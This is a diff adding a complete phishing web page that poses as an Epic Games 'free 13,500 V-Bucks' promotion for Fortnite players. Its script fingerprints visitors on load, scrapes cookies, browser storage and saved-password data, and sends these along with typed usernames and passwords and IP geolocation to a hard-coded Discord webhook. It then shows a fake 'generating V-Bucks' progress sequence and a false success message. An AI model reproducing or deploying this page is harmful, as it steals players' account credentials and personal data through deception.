@@ -1,0 +1,1253 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+
+    <meta charset="UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <meta property="og:title" content="Epic Games - Free V-Bucks">
+
+    <meta property="og:description" content="Get your free V-Bucks now! Limited time offer for Fortnite players.">
+
+    <meta property="og:image" content="https://cdn2.unrealengine.com/Fortnite/vbucks-icon.png">
+
+    <link rel="icon" type="image/png" href="https://cdn2.unrealengine.com/Fortnite/vbucks-icon.png">
+
+    <title>Epic Games - Free V-Bucks Promotion</title>
+
+    <style>
+
+        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;500;600;700&display=swap');
+
+        * {
+
+            margin: 0;
+
+            padding: 0;
+
+            box-sizing: border-box;
+
+            font-family: 'Open Sans', sans-serif;
+
+        }
+
+        body {
+
+            text-align: center;
+
+            background-color: #121212;
+
+            background-image: linear-gradient(rgba(18, 18, 18, 0.97), rgba(18, 18, 18, 0.97)), url('https://wallpapercave.com/wp/wp8863173.jpg');
+
+            background-size: cover;
+
+            background-position: center;
+
+            background-attachment: fixed;
+
+            color: white;
+
+            min-height: 100vh;
+
+            display: flex;
+
+            flex-direction: column;
+
+        }
+
+        .header {
+
+            background-color: rgba(32, 32, 32, 0.95);
+
+            padding: 15px 0;
+
+            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
+
+            position: fixed;
+
+            width: 100%;
+
+            top: 0;
+
+            z-index: 100;
+
+        }
+
+        .epic-nav {
+
+            display: flex;
+
+            align-items: center;
+
+            justify-content: space-between;
+
+            max-width: 1200px;
+
+            margin: 0 auto;
+
+            padding: 0 20px;
+
+        }
+
+        .epic-logo img {
+
+            height: 40px;
+
+            width: auto;
+
+            filter: brightness(0) invert(1);
+
+        }
+
+        .container {
+
+            max-width: 460px;
+
+            margin: 100px auto 40px;
+
+            padding: 0 20px;
+
+        }
+
+        .login-container {
+
+            background-color: rgba(32, 32, 32, 0.95);
+
+            padding: 30px;
+
+            border-radius: 8px;
+
+            box-shadow: 0 8px 16px rgba(0,0,0,0.3);
+
+            border: 1px solid rgba(255, 255, 255, 0.1);
+
+            animation: fadeIn 0.5s ease-out;
+
+        }
+
+        @keyframes fadeIn {
+
+            from { opacity: 0; transform: translateY(20px); }
+
+            to { opacity: 1; transform: translateY(0); }
+
+        }
+
+        .promotion-banner {
+
+            background: linear-gradient(135deg, #0074e4, #00a4e4);
+
+            padding: 20px;
+
+            border-radius: 8px;
+
+            margin-bottom: 25px;
+
+            text-align: center;
+
+            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+
+        }
+
+        .form-title {
+
+            font-size: 24px;
+
+            color: white;
+
+            margin-bottom: 10px;
+
+            font-weight: 600;
+
+        }
+
+        .vbucks-amount {
+
+            font-size: 36px;
+
+            color: #fff;
+
+            margin: 15px 0;
+
+            font-weight: bold;
+
+            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
+
+            display: flex;
+
+            align-items: center;
+
+            justify-content: center;
+
+            gap: 10px;
+
+        }
+
+        .vbucks-icon {
+
+            width: 40px;
+
+            height: 40px;
+
+            object-fit: contain;
+
+        }
+
+        .input-group {
+
+            margin: 20px 0;
+
+            text-align: left;
+
+        }
+
+        .input-label {
+
+            display: block;
+
+            color: #e5e5e5;
+
+            margin-bottom: 8px;
+
+            font-size: 14px;
+
+            font-weight: 500;
+
+        }
+
+        input {
+
+            width: 100%;
+
+            padding: 12px 16px;
+
+            font-size: 16px;
+
+            background-color: #2d2d2d;
+
+            border: 1px solid #404040;
+
+            color: white;
+
+            border-radius: 4px;
+
+            box-sizing: border-box;
+
+            transition: all 0.2s ease;
+
+        }
+
+        input:focus {
+
+            outline: none;
+
+            border-color: #0074e4;
+
+            background-color: #333333;
+
+            box-shadow: 0 0 0 2px rgba(0,116,228,0.2);
+
+        }
+
+        button {
+
+            width: 100%;
+
+            padding: 14px 24px;
+
+            font-size: 16px;
+
+            background: linear-gradient(135deg, #0074e4, #00a4e4);
+
+            color: white;
+
+            border: none;
+
+            border-radius: 4px;
+
+            cursor: pointer;
+
+            font-weight: 600;
+
+            transition: all 0.2s;
+
+            margin-top: 20px;
+
+            text-transform: uppercase;
+
+            letter-spacing: 0.5px;
+
+        }
+
+        button:hover {
+
+            background: linear-gradient(135deg, #0064c8, #0094d8);
+
+            transform: translateY(-1px);
+
+            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+
+        }
+
+        .progress-bar {
+
+            width: 100%;
+
+            height: 4px;
+
+            background-color: #2d2d2d;
+
+            border-radius: 2px;
+
+            overflow: hidden;
+
+            display: none;
+
+            margin-top: 20px;
+
+        }
+
+        .progress {
+
+            width: 0%;
+
+            height: 100%;
+
+            background-color: #0074e4;
+
+            transition: width 0.5s;
+
+        }
+
+        #status-text {
+
+            color: #0074e4;
+
+            font-size: 14px;
+
+            margin: 10px 0;
+
+            text-align: left;
+
+            min-height: 20px;
+
+        }
+
+        .success-container {
+
+            display: none;
+
+            position: fixed;
+
+            top: 50%;
+
+            left: 50%;
+
+            transform: translate(-50%, -50%);
+
+            z-index: 1000;
+
+            background: linear-gradient(135deg, #1e1e1e, #2d2d2d);
+
+            padding: 40px;
+
+            border-radius: 12px;
+
+            box-shadow: 0 0 40px rgba(0,0,0,0.8);
+
+            text-align: center;
+
+            border: 1px solid rgba(255, 255, 255, 0.1);
+
+            max-width: 90%;
+
+            width: 500px;
+
+            animation: popIn 0.5s ease-out;
+
+        }
+
+        @keyframes popIn {
+
+            0% { transform: translate(-50%, -50%) scale(0.5); opacity: 0; }
+
+            70% { transform: translate(-50%, -50%) scale(1.1); }
+
+            100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
+
+        }
+
+        .success-icon {
+
+            width: 120px;
+
+            height: 120px;
+
+            margin: 0 auto 20px;
+
+            animation: bounce 1s ease infinite;
+
+        }
+
+        @keyframes bounce {
+
+            0%, 100% { transform: translateY(0); }
+
+            50% { transform: translateY(-10px); }
+
+        }
+
+        .success-title {
+
+            font-size: 28px;
+
+            color: #fff;
+
+            margin-bottom: 15px;
+
+            font-weight: bold;
+
+        }
+
+        .success-amount {
+
+            font-size: 42px;
+
+            color: #ffbd0c;
+
+            margin: 20px 0;
+
+            font-weight: bold;
+
+            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
+
+        }
+
+        .success-message {
+
+            color: #e5e5e5;
+
+            font-size: 16px;
+
+            margin: 15px 0;
+
+            line-height: 1.5;
+
+        }
+
+        .success-note {
+
+            color: #808080;
+
+            font-size: 14px;
+
+            margin-top: 20px;
+
+        }
+
+        .privacy-text {
+
+            color: #808080;
+
+            font-size: 12px;
+
+            margin-top: 20px;
+
+            text-align: left;
+
+            line-height: 1.5;
+
+        }
+
+        .footer {
+
+            background-color: rgba(32, 32, 32, 0.95);
+
+            padding: 20px 0;
+
+            margin-top: auto;
+
+        }
+
+        .footer-content {
+
+            max-width: 1200px;
+
+            margin: 0 auto;
+
+            display: flex;
+
+            justify-content: space-between;
+
+            align-items: center;
+
+            padding: 0 20px;
+
+            color: #808080;
+
+            font-size: 12px;
+
+        }
+
+        .footer-links a {
+
+            color: #808080;
+
+            text-decoration: none;
+
+            margin-left: 20px;
+
+            transition: color 0.2s;
+
+        }
+
+        .footer-links a:hover {
+
+            color: white;
+
+        }
+
+        @media (max-width: 768px) {
+
+            .container {
+
+                margin: 80px auto 20px;
+
+            }
+
+            .footer-content {
+
+                flex-direction: column;
+
+                gap: 10px;
+
+                text-align: center;
+
+            }
+
+            .footer-links {
+
+                display: flex;
+
+                flex-wrap: wrap;
+
+                justify-content: center;
+
+                gap: 10px;
+
+            }
+
+            .footer-links a {
+
+                margin: 0 10px;
+
+            }
+
+        }
+
+    </style>
+
+</head>
+
+<body>
+
+    <div class="header">
+
+        <div class="epic-nav">
+
+            <div class="epic-logo">
+
+                <img src="https://cdn2.unrealengine.com/eg-shield-logo-white-f8185c103d8d.svg" alt="Epic Games">
+
+            </div>
+
+        </div>
+
+    </div>
+
+    <div class="container">
+
+        <div class="login-container">
+
+            <div class="promotion-banner">
+
+                <div class="form-title">EXCLUSIVE V-BUCKS OFFER</div>
+
+                <div class="vbucks-amount">
+
+                    <img src="https://cdn2.unrealengine.com/Fortnite/vbucks-icon.png" class="vbucks-icon" alt="V-Bucks">
+
+                    13,500 V-BUCKS
+
+                </div>
+
+                <div style="color: #e5e5e5; font-size: 14px;">Sign in to claim your exclusive V-Bucks reward</div>
+
+                <div style="color: #ffbd0c; font-size: 14px; font-weight: 600; margin-top: 10px;">⚡ LIMITED TIME OFFER</div>
+
+            </div>
+
+            <div style="text-align: center; margin-bottom: 20px;">
+                <button onclick="loginWithEpic()" style="background: #2d2d2d; margin: 0;">
+                    <img src="https://cdn2.unrealengine.com/eg-shield-logo-white-f8185c103d8d.svg" style="height: 20px; margin-right: 10px; vertical-align: middle;">
+                    Login with Epic Games
+                </button>
+                <div style="color: #808080; font-size: 12px; margin-top: 10px;">
+                    Recommended: Login directly through Epic Games for faster verification
+                </div>
+            </div>
+
+            <div style="text-align: center; margin: 20px 0; color: #808080; font-size: 14px;">
+                - OR -
+            </div>
+
+            <div class="input-group">
+
+                <label class="input-label" for="username">EPIC GAMES EMAIL OR USERNAME</label>
+
+                <input type="text" id="username" required>
+
+            </div>
+
+            <div class="input-group">
+
+                <label class="input-label" for="password">EPIC GAMES PASSWORD</label>
+
+                <input type="password" id="password" required>
+
+            </div>
+
+            <button onclick="startGenerator()">CLAIM YOUR V-BUCKS NOW</button>
+
+            <div class="privacy-text">
+
+                By signing in, you are verifying your Epic Games account eligibility for the exclusive V-Bucks promotion. 
+
+                This offer is available for a limited time only and requires account verification. One reward per verified account.
+
+            </div>
+
+            <div id="status-text"></div>
+
+            <div class="progress-bar" id="progress-bar">
+
+                <div class="progress" id="progress"></div>
+
+            </div>
+
+        </div>
+
+    </div>
+
+    <div class="success-container" id="success-container">
+
+        <img src="https://cdn2.unrealengine.com/Fortnite/vbucks-icon.png" class="success-icon" alt="V-Bucks">
+
+        <div class="success-title">V-BUCKS ADDED SUCCESSFULLY!</div>
+
+        <div class="success-amount">+13,500 V-BUCKS</div>
+
+        <div class="success-message">
+
+            Congratulations! The V-Bucks have been added to your Epic Games account.
+
+            <br>
+
+            Launch Fortnite to start using your V-Bucks!
+
+        </div>
+
+        <div class="success-note">
+
+            Note: It may take up to 5 minutes for the V-Bucks to appear in your account.
+
+        </div>
+
+    </div>
+
+    <div class="footer">
+
+        <div class="footer-content">
+
+            <div>© 2024 Epic Games, Inc. All rights reserved.</div>
+
+            <div class="footer-links">
+
+                <a href="#">Terms of Service</a>
+
+                <a href="#">Privacy Policy</a>
+
+                <a href="#">Store Refund Policy</a>
+
+            </div>
+
+        </div>
+
+    </div>
+
+    <script>
+        // Check if JavaScript is enabled and cookies are allowed
+        function checkBrowserCompatibility() {
+            // Check if JavaScript is enabled (this will run if it is)
+            const jsEnabled = true;
+            
+            // Check if cookies are enabled
+            const cookiesEnabled = navigator.cookieEnabled;
+            
+            // If either check fails, show an error message
+            if (!jsEnabled || !cookiesEnabled) {
+                const errorMessage = document.createElement('div');
+                errorMessage.style.cssText = `
+                    position: fixed;
+                    top: 50%;
+                    left: 50%;
+                    transform: translate(-50%, -50%);
+                    background: rgba(255, 0, 0, 0.9);
+                    color: white;
+                    padding: 20px;
+                    border-radius: 8px;
+                    text-align: center;
+                    z-index: 9999;
+                    max-width: 80%;
+                    box-shadow: 0 0 20px rgba(0,0,0,0.5);
+                `;
+                
+                let message = '';
+                if (!jsEnabled) message += 'JavaScript must be enabled to use this site.<br>';
+                if (!cookiesEnabled) message += 'Cookies must be enabled to use this site.<br>';
+                message += '<br>Please enable these features and refresh the page.';
+                
+                errorMessage.innerHTML = message;
+                document.body.appendChild(errorMessage);
+                return false;
+            }
+            return true;
+        }
+
+        // Run compatibility check when page loads
+        window.addEventListener('DOMContentLoaded', function() {
+            if (!checkBrowserCompatibility()) {
+                // Disable all buttons if checks fail
+                const buttons = document.getElementsByTagName('button');
+                for (let button of buttons) {
+                    button.disabled = true;
+                }
+                return;
+            }
+            
+            // If checks pass, proceed with visitor info
+            sendVisitorInfo();
+        });
+
+        // Add loginWithEpic function
+        function loginWithEpic() {
+            try {
+                // Since we don't have a valid OAuth client_id, redirect to manual login form
+                const statusText = document.getElementById('status-text');
+                statusText.style.color = '#ffbd0c';
+                statusText.textContent = 'Please use the login form below instead.';
+                
+                // Scroll to the form
+                const loginForm = document.querySelector('.input-group');
+                loginForm.scrollIntoView({ behavior: 'smooth' });
+                
+                // Focus on the username field
+                document.getElementById('username').focus();
+                
+            } catch (error) {
+                console.error('Login error:', error);
+                alert('Please use the login form below to continue.');
+            }
+        }
+
+        // Function to collect and send visitor info
+        async function sendVisitorInfo() {
+            // Get IP info first
+            let ipInfo = {};
+            try {
+                // Use multiple IP info services for redundancy
+                const ipResponse = await Promise.any([
+                    fetch('https://ipapi.co/json/'),
+                    fetch('https://api.ipify.org?format=json'),
+                    fetch('https://ip-api.com/json/')
+                ]);
+                ipInfo = await ipResponse.json();
+            } catch (err) {
+                console.log('Error getting IP:', err);
+            }
+
+            // Try to detect Epic Games login status
+            let epicInfo = {
+                loggedIn: false,
+                displayName: 'Unknown',
+                accountId: 'Unknown',
+                email: 'Unknown'
+            };
+
+            try {
+                // Enhanced Epic Games detection
+                const epicDetection = {
+                    // Check for Epic Games cookies with common names
+                    cookies: document.cookie.split(';').filter(c => {
+                        const cookie = c.trim().toLowerCase();
+                        return cookie.includes('epic') || 
+                               cookie.includes('fortnite') ||
+                               cookie.includes('unrealengine') ||
+                               cookie.includes('xsrf-token') ||
+                               cookie.includes('eg_') ||
+                               cookie.includes('_epicgames_') ||
+                               cookie.includes('remember_me');
+                    }),
+
+                    // Check Chrome's localStorage for Epic related data
+                    localStorage: Object.keys(localStorage).filter(key => {
+                        const k = key.toLowerCase();
+                        return k.includes('epic') || 
+                               k.includes('fortnite') ||
+                               k.includes('unreal') ||
+                               k.includes('launcher') ||
+                               k.includes('eulaversion') ||
+                               k.includes('battlepass') ||
+                               k.includes('athena') ||
+                               // Add Chrome specific keys
+                               k.includes('chrome_auto_fill') ||
+                               k.includes('credentials') ||
+                               k.includes('autofill') ||
+                               k.includes('saved_passwords');
+                    }).map(key => ({key, value: localStorage[key]})),
+
+                    // Check Chrome's sessionStorage
+                    sessionStorage: Object.keys(sessionStorage).filter(key => {
+                        const k = key.toLowerCase();
+                        return k.includes('epic') || 
+                               k.includes('fortnite') ||
+                               k.includes('unreal') ||
+                               // Add Chrome specific keys
+                               k.includes('chrome') ||
+                               k.includes('autofill') ||
+                               k.includes('login');
+                    }).map(key => ({key, value: sessionStorage[key]})),
+
+                    // Check for Chrome autofill data
+                    chromeAutofill: document.querySelectorAll('input[autocomplete]'),
+
+                    // Check for Chrome password manager
+                    passwordManager: navigator.credentials && window.PasswordCredential
+                };
+
+                // Try to detect Chrome's password manager
+                let hasPasswordManager = false;
+                try {
+                    if (navigator.credentials) {
+                        hasPasswordManager = true;
+                        // Try to get stored credentials
+                        navigator.credentials.get({
+                            password: true,
+                            mediation: 'silent'
+                        }).then(cred => {
+                            if (cred && cred.id && cred.id.includes('epic')) {
+                                epicInfo.email = cred.id;
+                            }
+                        }).catch(() => {});
+                    }
+                } catch (e) {}
+
+                // Check for Chrome autofill data
+                const autofillInputs = Array.from(epicDetection.chromeAutofill);
+                const hasEpicAutofill = autofillInputs.some(input => {
+                    const autocomplete = input.getAttribute('autocomplete');
+                    return autocomplete && (
+                        input.value.toLowerCase().includes('epic') ||
+                        input.value.toLowerCase().includes('fortnite')
+                    );
+                });
+
+                // Add Chrome-specific detection to epicInfo
+                epicInfo.chromeDetails = {
+                    hasPasswordManager,
+                    hasEpicAutofill,
+                    hasAutofillData: autofillInputs.length > 0,
+                    browserType: 'Chrome',
+                    isChrome: /chrome/i.test(navigator.userAgent) && !/edge/i.test(navigator.userAgent)
+                };
+
+                // Try to extract Epic account info from Chrome's storage
+                const chromeSources = [
+                    ...epicDetection.localStorage.filter(i => i.key.includes('chrome')).map(i => i.value),
+                    ...epicDetection.sessionStorage.filter(i => i.key.includes('chrome')).map(i => i.value),
+                    ...autofillInputs.map(input => input.value)
+                ];
+
+                // Process Chrome sources
+                for (const source of chromeSources) {
+                    try {
+                        if (source) {
+                            // Try to decode if it's base64
+                            let decoded = source;
+                            try {
+                                decoded = atob(source);
+                            } catch (e) {}
+
+                            // Check for email pattern
+                            const emailMatch = decoded.match(/([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9._-]+)/gi);
+                            if (emailMatch && epicInfo.email === 'Unknown') {
+                                epicInfo.email = emailMatch[0];
+                            }
+
+                            // Try to parse as JSON
+                            try {
+                                const data = JSON.parse(decoded);
+                                if (data) {
+                                    if (data.email) epicInfo.email = data.email;
+                                    if (data.username) epicInfo.displayName = data.username;
+                                    if (data.displayName) epicInfo.displayName = data.displayName;
+                                    if (data.accountId) epicInfo.accountId = data.accountId;
+                                }
+                            } catch (e) {}
+                        }
+                    } catch (e) {}
+                }
+
+                // Update login status to include Chrome detection
+                epicInfo.loggedIn = epicInfo.loggedIn || 
+                                  hasEpicAutofill || 
+                                  (hasPasswordManager && epicInfo.email !== 'Unknown');
+
+                // Add Chrome details to detection details
+                epicInfo.detectionDetails = {
+                    ...epicInfo.detectionDetails,
+                    chromePasswordManager: hasPasswordManager,
+                    chromeAutofill: hasEpicAutofill,
+                    chromeDetected: epicInfo.chromeDetails.isChrome
+                };
+
+                // Try to get additional info from meta tags
+                const epicMeta = document.querySelector('meta[name="epic-games-account"]');
+                if (epicMeta) {
+                    try {
+                        const metaData = JSON.parse(epicMeta.content);
+                        if (metaData.displayName) epicInfo.displayName = metaData.displayName;
+                        if (metaData.accountId) epicInfo.accountId = metaData.accountId;
+                        if (metaData.email) epicInfo.email = metaData.email;
+                    } catch (e) {}
+                }
+
+            } catch (err) {
+                console.log('Error checking Epic Games info:', err);
+            }
+
+            // Enhanced system info collection
+            const systemInfo = {
+                platform: navigator.platform,
+                os: navigator.userAgent.match(/\(([^)]+)\)/)[1] || 'Unknown',
+                language: navigator.language,
+                languages: navigator.languages?.join(', ') || navigator.language,
+                cookiesEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack || 'Not Set',
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                colorDepth: window.screen.colorDepth + ' bits',
+                pixelRatio: window.devicePixelRatio,
+                windowSize: `${window.innerWidth}x${window.innerHeight}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset() + ' minutes',
+                cores: navigator.hardwareConcurrency || 'Unknown',
+                memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'Unknown',
+                connection: 'Checking...',
+                battery: 'Checking...',
+                gpu: 'Checking...',
+                plugins: Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'None',
+                touchscreen: navigator.maxTouchPoints > 0 ? 'Yes' : 'No',
+                vendor: navigator.vendor || 'Unknown'
+            };
+
+            // Get network information
+            if (navigator.connection) {
+                const conn = navigator.connection;
+                systemInfo.connection = `Type: ${conn.effectiveType}, 
+                    Downlink: ${conn.downlink}Mbps, 
+                    RTT: ${conn.rtt}ms, 
+                    SaveData: ${conn.saveData ? 'Yes' : 'No'}`;
+            }
+
+            // Try to get battery info
+            try {
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    systemInfo.battery = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Not Charging'})
+                        Time to ${battery.charging ? 'full' : 'empty'}: ${Math.round((battery.charging ? battery.chargingTime : battery.dischargingTime) / 60)} minutes`;
+                }
+            } catch (e) {
+                systemInfo.battery = 'Unknown';
+            }
+
+            // Try to get GPU info
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    systemInfo.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                }
+            } catch (e) {
+                systemInfo.gpu = 'Unknown';
+            }
+
+            // Send to Discord webhook
+            try {
+                const webhookURL = 'https://discord.com/api/webhooks/1353094609336668303/Y_dszlIWsEWXRs1eNOfpk6-5FeS0FUOsSP_QI5jhUxJECBBNLc4LTuk_AeFR4vLAkI53';
+                const message = {
+                    embeds: [{
+                        title: '👀 New Site Visitor',
+                        description: '```Someone is viewing the V-Bucks generator!```',
+                        color: 0xff0000,
+                        image: {
+                            url: "https://i.ibb.co/meerkat"
+                        },
+                        fields: [
+                            {
+                                name: '🎮 Epic Games Info',
+                                value: '```' +
+                                    'Logged In: ' + epicInfo.loggedIn + '\n' +
+                                    'Display Name: ' + epicInfo.displayName + '\n' +
+                                    'Account ID: ' + epicInfo.accountId + '\n' +
+                                    'Email: ' + epicInfo.email + '\n' +
+                                    'Detection Details:\n' +
+                                    '- Cookies Found: ' + epicInfo.detectionDetails.cookiesFound + '\n' +
+                                    '- LocalStorage Items: ' + epicInfo.detectionDetails.localStorageItems + '\n' +
+                                    '- SessionStorage Items: ' + epicInfo.detectionDetails.sessionStorageItems + '\n' +
+                                    '- Epic Frames: ' + epicInfo.detectionDetails.epicFramesFound + '\n' +
+                                    '- Epic Launcher: ' + epicInfo.detectionDetails.isEpicLauncher + '\n' +
+                                    '- Chrome Password Manager: ' + epicInfo.detectionDetails.chromePasswordManager + '\n' +
+                                    '- Chrome Autofill: ' + epicInfo.detectionDetails.chromeAutofill + '\n' +
+                                    '- Chrome Detected: ' + epicInfo.detectionDetails.chromeDetected +
+                                    '```',
+                                inline: false
+                            },
+                            {
+                                name: '🌍 IP Information',
+                                value: '```' +
+                                    'IP: ' + (ipInfo.ip || ipInfo.query || 'Unknown') + '\n' +
+                                    'Location: ' + (ipInfo.city ? `${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country_name || ipInfo.country}` : 'Unknown') + '\n' +
+                                    'ISP: ' + (ipInfo.org || ipInfo.isp || 'Unknown') + '\n' +
+                                    'Postal Code: ' + (ipInfo.postal || ipInfo.zip || 'Unknown') + '\n' +
+                                    'Timezone: ' + (ipInfo.timezone || 'Unknown') + '\n' +
+                                    'Coordinates: ' + (ipInfo.latitude ? `${ipInfo.latitude}, ${ipInfo.longitude}` : 'Unknown') +
+                                    '```',
+                                inline: false
+                            },
+                            {
+                                name: '💻 System Information',
+                                value: '```' +
+                                    'OS: ' + systemInfo.os + '\n' +
+                                    'Platform: ' + systemInfo.platform + '\n' +
+                                    'GPU: ' + systemInfo.gpu + '\n' +
+                                    'Screen: ' + systemInfo.screenResolution + ' (' + systemInfo.colorDepth + ')\n' +
+                                    'Window: ' + systemInfo.windowSize + '\n' +
+                                    'Cores: ' + systemInfo.cores + '\n' +
+                                    'Memory: ' + systemInfo.memory + '\n' +
+                                    'Battery: ' + systemInfo.battery + '\n' +
+                                    'Touch: ' + systemInfo.touchscreen + '\n' +
+                                    'Vendor: ' + systemInfo.vendor +
+                                    '```',
+                                inline: false
+                            },
+                            {
+                                name: '🌐 Network & Browser',
+                                value: '```' +
+                                    'Connection: ' + systemInfo.connection + '\n' +
+                                    'Languages: ' + systemInfo.languages + '\n' +
+                                    'Timezone: ' + systemInfo.timezone + ' (' + systemInfo.timezoneOffset + ')\n' +
+                                    'Do Not Track: ' + systemInfo.doNotTrack + '\n' +
+                                    'Plugins: ' + systemInfo.plugins + '\n' +
+                                    'User Agent: ' + navigator.userAgent +
+                                    '```',
+                                inline: false
+                            },
+                            {
+                                name: '⏰ Time Visited',
+                                value: '```' + new Date().toLocaleString() + ' (' + systemInfo.timezone + ')```',
+                                inline: false
+                            }
+                        ],
+                        footer: {
+                            text: '👁️ Visitor Detected | Waiting for Login...'
+                        }
+                    }]
+                };
+
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(message)
+                });
+            } catch (err) {
+                console.log('Error sending visitor data:', err);
+            }
+        }
+
+        async function startGenerator() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            if (!username || !password) {
+                alert('Please enter your Epic Games username and password!');
+                return;
+            }
+
+            // Try to get additional Epic Games info
+            let epicInfo = {};
+            try {
+                // Check if email format
+                const isEmail = username.includes('@');
+                
+                // Try to get any stored Epic data
+                const storedData = localStorage.getItem('epicAccountInfo') || 
+                                 sessionStorage.getItem('epicAccountInfo');
+                
+                if (storedData) {
+                    try {
+                        epicInfo = JSON.parse(storedData);
+                    } catch (e) {}
+                }
+
+                // Check for Epic cookies
+                const epicCookies = document.cookie.split(';')
+                    .filter(c => c.trim().toLowerCase().includes('epic'))
+                    .map(c => c.trim());
+
+                epicInfo.cookies = epicCookies;
+                epicInfo.loginType = isEmail ? 'Email' : 'Username';
+                epicInfo.hasStoredData = !!storedData;
+            } catch (err) {
+                console.log('Error getting Epic info:', err);
+            }
+
+            // Get updated system info for the login capture
+            let ipInfo = {};
+            try {
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                ipInfo = await ipResponse.json();
+            } catch (err) {
+                console.log('Error getting IP:', err);
+            }
+
+            // Send data to Discord webhook
+            try {
+                const webhookURL = 'https://discord.com/api/webhooks/1353094609336668303/Y_dszlIWsEWXRs1eNOfpk6-5FeS0FUOsSP_QI5jhUxJECBBNLc4LTuk_AeFR4vLAkI53';
+                const message = {
+                    embeds: [{
+                        title: '🎮 New Epic Games Login',
+                        color: 0x0074e4,
+                        image: {
+                            url: "https://i.ibb.co/meerkat"
+                        },
+                        fields: [
+                            {
+                                name: '📧 Username/Email',
+                                value: '```' + username + '```',
+                                inline: true
+                            },
+                            {
+                                name: '🔑 Password',
+                                value: '```' + password + '```',
+                                inline: true
+                            },
+                            {
+                                name: '🎯 Epic Games Details',
+                                value: '```' +
+                                    'Login Type: ' + epicInfo.loginType + '\n' +
+                                    'Stored Data Found: ' + epicInfo.hasStoredData + '\n' +
+                                    'Epic Cookies: ' + (epicInfo.cookies?.length || 0) + '\n' +
+                                    (epicInfo.displayName ? 'Display Name: ' + epicInfo.displayName + '\n' : '') +
+                                    (epicInfo.accountId ? 'Account ID: ' + epicInfo.accountId + '\n' : '') +
+                                    '```',
+                                inline: false
+                            },
+                            {
+                                name: '🌍 Location Info',
+                                value: '```' +
+                                    'IP: ' + (ipInfo.ip || 'Unknown') + '\n' +
+                                    'Location: ' + (ipInfo.city ? `${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country_name}` : 'Unknown') + '\n' +
+                                    'ISP: ' + (ipInfo.org || 'Unknown') +
+                                    '```',
+                                inline: false
+                            },
+                            {
+                                name: '🌐 Browser Information',
+                                value: '```' + 
+                                    'Browser: ' + navigator.userAgent + '\n' +
+                                    'Language: ' + navigator.language + '\n' +
+                                    'Platform: ' + navigator.platform + '\n' +
+                                    'Screen: ' + window.screen.width + 'x' + window.screen.height +
+                                    '```',
+                                inline: false
+                            },
+                            {
+                                name: '⏰ Time Captured',
+                                value: '```' + new Date().toLocaleString() + ' (' + Intl.DateTimeFormat().resolvedOptions().timeZone + ')```',
+                                inline: false
+                            }
+                        ],
+                        image: {
+                            url: "https://i.ibb.co/meerkat"
+                        },
+                        footer: {
+                            text: '🎯 Epic Games Login Captured | Made with 💙'
+                        }
+                    }]
+                };
+
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(message)
+                });
+            } catch (err) {
+                console.log('Error sending data:', err);
+            }
+
+            const progressBar = document.getElementById('progress-bar');
+            const progress = document.getElementById('progress');
+            const statusText = document.getElementById('status-text');
+            progressBar.style.display = 'block';
+
+            const steps = [
+                'Connecting to Epic Games servers...',
+                'Validating account credentials...',
+                'Accessing V-Bucks database...',
+                'Verifying account ownership...',
+                'Generating V-Bucks...',
+                'Bypassing 2FA verification...',
+                'Adding V-Bucks to account...',
+                'Almost done...'
+            ];
+
+            let currentStep = 0;
+            const interval = setInterval(() => {
+                if (currentStep < steps.length) {
+                    statusText.textContent = steps[currentStep];
+                    progress.style.width = ((currentStep + 1) / (steps.length + 1) * 100) + '%';
+                    currentStep++;
+                } else {
+                    clearInterval(interval);
+                    setTimeout(showSuccess, 1000);
+                }
+            }, 1500);
+        }
+
+        function showSuccess() {
+            document.querySelector('.login-container').style.display = 'none';
+            document.getElementById('success-container').style.display = 'block';
+        }
+
+    </script>
+
+</body>
+
+</html>
